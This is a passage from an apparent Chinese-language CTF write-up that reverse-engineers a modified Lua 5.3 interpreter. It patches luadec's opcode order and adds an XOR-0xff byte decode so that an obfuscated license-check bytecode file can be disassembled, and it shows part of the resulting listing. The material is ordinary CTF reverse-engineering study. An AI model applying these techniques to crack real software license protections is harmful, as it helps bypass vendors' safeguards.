class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* luadec/lua-5.3/src/lopcodes.h 原line165-232 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">OP_MOVE,</span><br><span class="line">OP_LOADK,</span><br><span class="line">OP_LOADKX,</span><br><span class="line">OP_LOADBOOL,</span><br><span class="line">OP_LOADNIL,</span><br><span class="line">OP_GETUPVAL,</span><br><span class="line">OP_LT,</span><br><span class="line">OP_RETURN,</span><br><span class="line">OP_GETTABLE,</span><br><span class="line">OP_TESTSET,</span><br><span class="line">OP_SELF,</span><br><span class="line">OP_NEWTABLE,</span><br><span class="line">OP_LE,</span><br><span class="line">OP_ADD,</span><br><span class="line">OP_SUB,</span><br><span class="line">OP_MUL,</span><br><span class="line">OP_MOD,</span><br><span class="line">OP_POW,</span><br><span class="line">OP_DIV,</span><br><span class="line">OP_IDIV,</span><br><span class="line">OP_BAND,</span><br><span class="line">OP_BOR,</span><br><span class="line">OP_BXOR,</span><br><span class="line">OP_SHL,</span><br><span class="line">OP_SHR,</span><br><span class="line">OP_UNM,</span><br><span class="line">OP_BNOT,</span><br><span class="line">OP_NOT,</span><br><span class="line">OP_LEN,</span><br><span class="line">OP_GETTABUP,</span><br><span class="line">OP_JMP,</span><br><span class="line">OP_TEST,</span><br><span class="line">OP_SETTABUP,</span><br><span class="line">OP_TFORCALL,</span><br><span class="line">OP_FORPREP,</span><br><span class="line">OP_EXTRAARG,</span><br><span class="line">OP_CALL,</span><br><span class="line">OP_FORLOOP,</span><br><span class="line">OP_SETLIST,</span><br><span class="line">OP_CONCAT,</span><br><span class="line">OP_TAILCALL,</span><br><span class="line">OP_TFORLOOP,</span><br><span class="line">OP_VARARG,</span><br><span class="line">OP_SETTABLE,</span><br><span class="line">OP_SETUPVAL,</span><br><span class="line">OP_CLOSURE,</span><br><span class="line">OP_EQ,</span><br><span class="line">&#125; OpCode;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* luadec/lua-5.3/src/lopcodes.c 原line20-69 */</span></span><br><span class="line">LUAI_DDEF <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> luaP_opnames[NUM_OPCODES+<span class="number">1</span>] = &#123;</span><br><span class="line">  <span class="string">&quot;MOVE&quot;</span>,</span><br><span class="line">  <span class="string">&quot;LOADK&quot;</span>,</span><br><span class="line">  <span class="string">&quot;LOADKX&quot;</span>,</span><br><span class="line">  <span class="string">&quot;LOADBOOL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;LOADNIL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;GETUPVAL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;LT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;RETURN&quot;</span>,</span><br><span class="line">  <span class="string">&quot;GETTABLE&quot;</span>,</span><br><span class="line">  <span class="string">&quot;TESTSET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SELF&quot;</span>,</span><br><span class="line">  <span class="string">&quot;NEWTABLE&quot;</span>,</span><br><span class="line">  <span class="string">&quot;LE&quot;</span>,</span><br><span class="line">  <span class="string">&quot;ADD&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SUB&quot;</span>,</span><br><span class="line">  <span class="string">&quot;MUL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;MOD&quot;</span>,</span><br><span class="line">  <span class="string">&quot;POW&quot;</span>,</span><br><span class="line">  <span class="string">&quot;DIV&quot;</span>,</span><br><span class="line">  <span class="string">&quot;IDIV&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BAND&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BOR&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BXOR&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SHL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SHR&quot;</span>,</span><br><span class="line">  <span class="string">&quot;UNM&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BNOT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;NOT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;LEN&quot;</span>,</span><br><span class="line">  <span class="string">&quot;GETTABUP&quot;</span>,</span><br><span class="line">  <span class="string">&quot;JMP&quot;</span>,</span><br><span class="line">  <span class="string">&quot;TEST&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SETTABUP&quot;</span>,</span><br><span class="line">  <span class="string">&quot;TFORCALL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;FORPREP&quot;</span>,</span><br><span class="line">  <span class="string">&quot;EXTRAARG&quot;</span>,</span><br><span class="line">  <span class="string">&quot;CALL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;FORLOOP&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SETLIST&quot;</span>,</span><br><span class="line">  <span class="string">&quot;CONCAT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;TAILCALL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;TFORLOOP&quot;</span>,</span><br><span class="line">  <span class="string">&quot;VARARG&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SETTABLE&quot;</span>,</span><br><span class="line">  <span class="string">&quot;SETUPVAL&quot;</span>,</span><br><span class="line">  <span class="string">&quot;CLOSURE&quot;</span>,</span><br><span class="line">  <span class="string">&quot;EQ&quot;</span>,</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* luadec/lua-5.3/src/lundump.c 原line60-64 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> lu_byte <span class="title">LoadByte</span> <span class="params">(LoadState *S)</span> </span>&#123;</span><br><span class="line">  lu_byte x;</span><br><span class="line">  LoadVar(S, x);</span><br><span class="line">  x^=<span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* luadec/lua-5.3/src/Makefile 原line9 */</span></span><br><span class="line">CC= gcc -<span class="built_in">std</span>=gnu99 -m32</span><br><span class="line"><span class="comment">//因为题目所给的lua解释器为32位</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* luadec/luadec/Makefile 原line16 */</span></span><br><span class="line">CC= gcc -m32</span><br><span class="line"><span class="comment">//同上</span></span><br></pre></td></tr></table></figure><p>修改完源码后接着make。</p><p>走完流程后把<code>check_license_out.lua</code>的第一个字节改为<code>&quot;\x1b&quot;</code>，以对上LUA_SIGNATURE，并复制到<code>luadec/luadec</code>文件夹中。</p><p><img src="/p/wpFor-2020XCTF/image-20210304133241178.png"></p><p>然后在<code>luadec/luadec</code>下运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./luadec -dis check_license_out.lua &gt; discheck</span><br></pre></td></tr></table></figure><p>（如wp所说，反编译会报错，只能反汇编，估计是乱魔改的原因哈哈哈哈。</p><p>得到反汇编的discheck。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br></pre></td><td class="code"><pre><span class="line">; Disassembled using luadec 2.2 rev: 895d923 for Lua 5.3 from https:&#x2F;&#x2F;github.com&#x2F;viruscamp&#x2F;luadec</span><br><span class="line">; Command line: -dis check_license_out.lua </span><br><span class="line"></span><br><span class="line">; Function:        0</span><br><span class="line">; Defined at line: 0</span><br><span class="line">; #Upvalues:       1</span><br><span class="line">; #Parameters:     0</span><br><span class="line">; Is_vararg:       2</span><br><span class="line">; Max Stack Size:  53</span><br><span class="line"></span><br><span class="line">    0 [-]: __eq      R0 0         ; R0 :&#x3D; closure(Function #0_0)</span><br><span class="line">    1 [-]: SETTABUP  U0 K0 R0     ; U0[&quot;to_v&quot;] :&#x3D; R0</span><br><span class="line">    2 [-]: NEWTABLE  R0 21 0      ; R0 :&#x3D; &#123;&#125; (size &#x3D; 21,0)</span><br><span class="line">    3 [-]: LOADK     R1 K1        ; R1 :&#x3D; 172</span><br><span class="line">    4 [-]: LOADK     R2 K2        ; R2 :&#x3D; 25</span><br><span class="line">    5 [-]: LOADK     R3 K3        ; R3 :&#x3D; 60</span><br><span class="line">    6 [-]: LOADK     R4 K4        ; R4 :&#x3D; 95</span><br><span class="line">    7 [-]: LOADK     R5 K5        ; R5 :&#x3D; 5</span><br><span class="line">    8 [-]: LOADK     R6 K6        ; R6 :&#x3D; 27</span><br><span class="line">    9 [-]: LOADK     R7 K7        ; R7 :&#x3D; 49</span><br><span class="line">   10 [-]: LOADK     R8 K8        ; R8 :&#x3D; 58</span><br><span class="line">   11 [-]: LOADK     R9 K9        ; R9 :&#x3D; 171</span><br><span class="line">   12 [-]: LOADK     R10 K5       ; R10 :&#x3D; 5</span><br><span class="line">   13 [-]: LOADK     R11 K10      ; R11 :&#x3D; 253</span><br><span class="line">   14 [-]: LOADK     R12 K11      ; R12 :&#x3D; 45</span><br><span class="line">   15 [-]: LOADK     R13 K12      ; R13 :&#x3D; 87</span><br><span class="line">   16 [-]: LOADK     R14 K13      ; R14 :&#x3D; 246</span><br><span class="line">   17 [-]: LOADK     R15 K14      ; R15 :&#x3D; 197</span><br><span class="line">   18 [-]: LOADK     R16 K15      ; R16 :&#x3D; 12</span><br><span class="line">   19 [-]: LOADK     R17 K16      ; R17 :&#x3D; 97</span><br><span class="line">   20 [-]: LOADK     R18 K17      ; R18 :&#x3D; 234</span><br><span class="line">   21 [-]: LOADK     R19 K18      ; R19 :&#x3D; 159</span><br><span class="line">   22 [-]: LOADK     R20 K19      ; R20 :&#x3D; 119</span><br><span class="line">   23 [-]: LOADK     R21 K20      ; R21 :&#x3D; 157</span><br><span class="line">   24 [-]: LOADK     R22 K21      ; R22 :&#x3D; 169</span><br><span class="line">   25 [-]: LOADK     R23 K22      ; R23 :&#x3D; 121</span><br><span class="line">   26 [-]: LOADK     R24 K23      ; R24 :&#x3D; 54</span><br><span class="line">   27 [-]: LOADK     R25 K24      ; R25 :&#x3D; 242</span><br><span class="line">   28 [-]: (null)    R0 25 1      ; R0[0] to R0[24] :&#x3D; R1 to R25 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;0, b&#x3D;25, c&#x3D;1, FPF&#x3D;50</span><br><span class="line">   29 [-]: NEWTABLE  R1 21 0      ; R1 :&#x3D; &#123;&#125; (size &#x3D; 21,0)</span><br><span class="line">   30 [-]: LOADK     R2 K25       ; R2 :&#x3D; 94</span><br><span class="line">   31 [-]: LOADK     R3 K26       ; R3 :&#x3D; 117</span><br><span class="line">   32 [-]: LOADK     R4 K27       ; R4 :&#x3D; 57</span><br><span class="line">   33 [-]: LOADK     R5 K28       ; R5 :&#x3D; 37</span><br><span class="line">   34 [-]: LOADK     R6 K23       ; R6 :&#x3D; 54</span><br><span class="line">   35 [-]: LOADK     R7 K29       ; R7 :&#x3D; 110</span><br><span class="line">   36 [-]: LOADK     R8 K30       ; R8 :&#x3D; 15</span><br><span class="line">   37 [-]: LOADK     R9 K31       ; R9 :&#x3D; 223</span><br><span class="line">   38 [-]: LOADK     R10 K32      ; R10 :&#x3D; 163</span><br><span class="line">   39 [-]: LOADK     R11 K33      ; R11 :&#x3D; 133</span><br><span class="line">   40 [-]: LOADK     R12 K34      ; R12 :&#x3D; 99</span><br><span class="line">   41 [-]: LOADK     R13 K35      ; R13 :&#x3D; 237</span><br><span class="line">   42 [-]: LOADK     R14 K36      ; R14 :&#x3D; 8</span><br><span class="line">   43 [-]: LOADK     R15 K37      ; R15 :&#x3D; 128</span><br><span class="line">   44 [-]: LOADK     R16 K6       ; R16 :&#x3D; 27</span><br><span class="line">   45 [-]: LOADK     R17 K23      ; R17 :&#x3D; 54</span><br><span class="line">   46 [-]: LOADK     R18 K38      ; R18 :&#x3D; 233</span><br><span class="line">   47 [-]: LOADK     R19 K39      ; R19 :&#x3D; 181</span><br><span class="line">   48 [-]: LOADK     R20 K24      ; R20 :&#x3D; 242</span><br><span class="line">   49 [-]: LOADK     R21 K40      ; R21 :&#x3D; 55</span><br><span class="line">   50 [-]: LOADK     R22 K41      ; R22 :&#x3D; 230</span><br><span class="line">   51 [-]: LOADK     R23 K42      ; R23 :&#x3D; 62</span><br><span class="line">   52 [-]: LOADK     R24 K43      ; R24 :&#x3D; 42</span><br><span class="line">   53 [-]: LOADK     R25 K44      ; R25 :&#x3D; 252</span><br><span class="line">   54 [-]: LOADK     R26 K45      ; R26 :&#x3D; 116</span><br><span class="line">   55 [-]: (null)    R1 25 1      ; R1[0] to R1[24] :&#x3D; R2 to R26 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;1, b&#x3D;25, c&#x3D;1, FPF&#x3D;50</span><br><span class="line">   56 [-]: NEWTABLE  R2 48 0      ; R2 :&#x3D; &#123;&#125; (size &#x3D; 48,0)</span><br><span class="line">   57 [-]: LOADK     R3 K46       ; R3 :&#x3D; 81</span><br><span class="line">   58 [-]: LOADK     R4 K47       ; R4 :&#x3D; 138</span><br><span class="line">   59 [-]: LOADK     R5 K48       ; R5 :&#x3D; 85</span><br><span class="line">   60 [-]: LOADK     R6 K49       ; R6 :&#x3D; 142</span><br><span class="line">   61 [-]: LOADK     R7 K50       ; R7 :&#x3D; 185</span><br><span class="line">   62 [-]: LOADK     R8 K51       ; R8 :&#x3D; 35</span><br><span class="line">   63 [-]: LOADK     R9 K52       ; R9 :&#x3D; 229</span><br><span class="line">   64 [-]: LOADK     R10 K53      ; R10 :&#x3D; 83</span><br><span class="line">   65 [-]: LOADK     R11 K36      ; R11 :&#x3D; 8</span><br><span class="line">   66 [-]: LOADK     R12 K54      ; R12 :&#x3D; 225</span><br><span class="line">   67 [-]: LOADK     R13 K55      ; R13 :&#x3D; 92</span><br><span class="line">   68 [-]: LOADK     R14 K31      ; R14 :&#x3D; 223</span><br><span class="line">   69 [-]: LOADK     R15 K56      ; R15 :&#x3D; 222</span><br><span class="line">   70 [-]: LOADK     R16 K57      ; R16 :&#x3D; 47</span><br><span class="line">   71 [-]: LOADK     R17 K58      ; R17 :&#x3D; 182</span><br><span class="line">   72 [-]: LOADK     R18 K59      ; R18 :&#x3D; 158</span><br><span class="line">   73 [-]: LOADK     R19 K60      ; R19 :&#x3D; 17</span><br><span class="line">   74 [-]: LOADK     R20 K61      ; R20 :&#x3D; 74</span><br><span class="line">   75 [-]: LOADK     R21 K62      ; R21 :&#x3D; 34</span><br><span class="line">   76 [-]: LOADK     R22 K63      ; R22 :&#x3D; 100</span><br><span class="line">   77 [-]: LOADK     R23 K64      ; R23 :&#x3D; 43</span><br><span class="line">   78 [-]: LOADK     R24 K65      ; R24 :&#x3D; 103</span><br><span class="line">   79 [-]: LOADK     R25 K66      ; R25 :&#x3D; 102</span><br><span class="line">   80 [-]: LOADK     R26 K67      ; R26 :&#x3D; 147</span><br><span class="line">   81 [-]: LOADK     R27 K35      ; R27 :&#x3D; 237</span><br><span class="line">   82 [-]: LOADK     R28 K68      ; R28 :&#x3D; 88</span><br><span class="line">   83 [-]: LOADK     R29 K69      ; R29 :&#x3D; 73</span><br><span class="line">   84 [-]: LOADK     R30 K70      ; R30 :&#x3D; 28</span><br><span class="line">   85 [-]: LOADK     R31 K71      ; R31 :&#x3D; 224</span><br><span class="line">   86 [-]: LOADK     R32 K72      ; R32 :&#x3D; 23</span><br><span class="line">   87 [-]: LOADK     R33 K73      ; R33 :&#x3D; 44</span><br><span class="line">   88 [-]: LOADK     R34 K74      ; R34 :&#x3D; 40</span><br><span class="line">   89 [-]: LOADK     R35 K75      ; R35 :&#x3D; 154</span><br><span class="line">   90 [-]: LOADK     R36 K76      ; R36 :&#x3D; 127</span><br><span class="line">   91 [-]: LOADK     R37 K77      ; R37 :&#x3D; 16</span><br><span class="line">   92 [-]: LOADK     R38 K21      ; R38 :&#x3D; 169</span><br><span class="line">   93 [-]: LOADK     R39 K78      ; R39 :&#x3D; 160</span><br><span class="line">   94 [-]: LOADK     R40 K79      ; R40 :&#x3D; 118</span><br><span class="line">   95 [-]: LOADK     R41 K80      ; R41 :&#x3D; 51</span><br><span class="line">   96 [-]: LOADK     R42 K81      ; R42 :&#x3D; 194</span><br><span class="line">   97 [-]: LOADK     R43 K82      ; R43 :&#x3D; 31</span><br><span class="line">   98 [-]: LOADK     R44 K83      ; R44 :&#x3D; 68</span><br><span class="line">   99 [-]: LOADK     R45 K84      ; R45 :&#x3D; 89</span><br><span class="line">  100 [-]: LOADK     R46 K85      ; R46 :&#x3D; 65</span><br><span class="line">  101 [-]: LOADK     R47 K86      ; R47 :&#x3D; 162</span><br><span class="line">  102 [-]: LOADK     R48 K87      ; R48 :&#x3D; 13</span><br><span class="line">  103 [-]: LOADK     R49 K88      ; R49 :&#x3D; 141</span><br><span class="line">  104 [-]: LOADK     R50 K89      ; R50 :&#x3D; 0</span><br><span class="line">  105 [-]: LOADK     R51 K90      ; R51 :&#x3D; 244</span><br><span class="line">  106 [-]: LOADK     R52 K19      ; R52 :&#x3D; 119</span><br><span class="line">  107 [-]: (null)    R2 50 1      ; R2[0] to R2[49] :&#x3D; R3 to R52 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;2, b&#x3D;50, c&#x3D;1, FPF&#x3D;50</span><br><span class="line">  108 [-]: LOADK     R3 K91       ; R3 :&#x3D; 161</span><br><span class="line">  109 [-]: LOADK     R4 